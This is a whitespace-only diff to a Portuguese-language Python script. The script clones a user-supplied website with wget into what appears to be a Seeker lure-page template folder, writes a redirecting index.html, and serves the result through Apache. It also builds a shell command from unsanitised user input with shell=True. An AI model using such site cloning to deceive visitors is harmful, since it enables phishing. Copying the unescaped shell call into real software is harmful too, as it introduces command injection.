@@ -32,13 +32,13 @@ def clone_website(url, user_home_path):
     print(f'[INFO] Clonando o site {url} com wget...')
     # Comando para clonar o site
     clone_command = f'wget --no-check-certificate --mirror --convert-links --adjust-extension --page-requisites --no-parent {url} -P {user_home_path}/seeker/template/custom_og_tags/'
-    
+
     try:
         subprocess.call(clone_command, shell=True)
         print(f'[INFO] Site clonado com sucesso. O arquivo clonado está em {user_home_path}/seeker/template/custom_og_tags/index2.html')
     except Exception as e:
         print(f'[ERROR] Erro ao clonar o site: {e}')
-    
+
     return os.path.join(user_home_path, 'seeker/template/custom_og_tags/index2.html')
 
 # Função para criar o index.html inicial
@@ -77,12 +77,12 @@ def create_initial_index(redirect_url, sitename, user_home_path):
         index_file.write(initial_html_content)
 
     print(f'[INFO] Arquivo inicial index.html gerado com sucesso em {index_path}')
-    
+
     # Copiar o index.html gerado para index_temp.html
     index_temp_path = os.path.join(user_home_path, 'seeker/template/custom_og_tags/index_temp.html')
     shutil.copy(index_path, index_temp_path)
     print(f'[INFO] Arquivo index.html copiado para index_temp.html em {index_temp_path}')
-    
+
     return index_path
 
 # Função para copiar arquivos para o diretório do Apache
@@ -116,10 +116,10 @@ def start_apache():
 # Fluxo principal
 def main():
     print(f'[INFO] Script iniciado, coletando entradas do usuário...')
-    
+
     # Obter o caminho do diretório home do usuário
     user_home_path = str(Path.home())
-    
+
     # Input para o caminho ou URL do HTML
     url = input("[INFO] Digite a URL para clonar: ")
     port = input("[INFO] Digite a porta em que vai hospedar o HTML: ")
